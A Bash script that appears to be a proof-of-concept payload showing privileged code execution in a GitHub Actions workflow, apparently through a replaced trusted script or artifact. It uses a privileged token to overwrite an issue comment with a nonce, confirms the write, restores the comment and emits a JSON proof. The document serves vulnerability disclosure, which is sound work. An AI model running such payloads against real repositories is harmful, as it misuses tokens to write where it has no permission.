#!/usr/bin/env bash
set -euo pipefail

api_path="repos/${GITHUB_REPOSITORY}/issues/comments/${PROOF_COMMENT_ID}"
original_body=$(GH_TOKEN="$PROOF_TOKEN" gh api "$api_path" --jq '.body')
nonce="CODEX_DOT_ARTIFACT_PRIVILEGED_WRITE_${GITHUB_RUN_ID}"
restore_needed=0

restore_comment() {
  if [[ "$restore_needed" == "1" ]]; then
    GH_TOKEN="$PROOF_TOKEN" gh api \
      --method PATCH \
      "$api_path" \
      -f body="$original_body" \
      >/dev/null || true
  fi
}
trap restore_comment EXIT

restore_needed=1
GH_TOKEN="$PROOF_TOKEN" gh api \
  --method PATCH \
  "$api_path" \
  -f body="$nonce" \
  >/dev/null

observed_body=$(GH_TOKEN="$PROOF_TOKEN" gh api "$api_path" --jq '.body')
if [[ "$observed_body" != "$nonce" ]]; then
  printf 'privileged write verification failed\n' >&2
  exit 1
fi

GH_TOKEN="$PROOF_TOKEN" gh api \
  --method PATCH \
  "$api_path" \
  -f body="$original_body" \
  >/dev/null

restored_body=$(GH_TOKEN="$PROOF_TOKEN" gh api "$api_path" --jq '.body')
if [[ "$restored_body" != "$original_body" ]]; then
  printf 'comment restoration verification failed\n' >&2
  exit 1
fi
restore_needed=0

jq -n \
  --arg marker "CODEX_DOT_ARTIFACT_PRIVILEGED_RCE_PROOF" \
  --arg before "${TRUSTED_SHA_BEFORE:-}" \
  --arg after "${TRUSTED_SHA_AFTER:-}" \
  --arg nonce "$nonce" \
  '{
    marker: $marker,
    script_sha_before: $before,
    script_sha_after: $after,
    script_replaced: ($before != $after),
    privileged_write_confirmed: true,
    protected_nonce: $nonce,
    state_restored: true
  }' > proof-result.json

cat proof-result.json
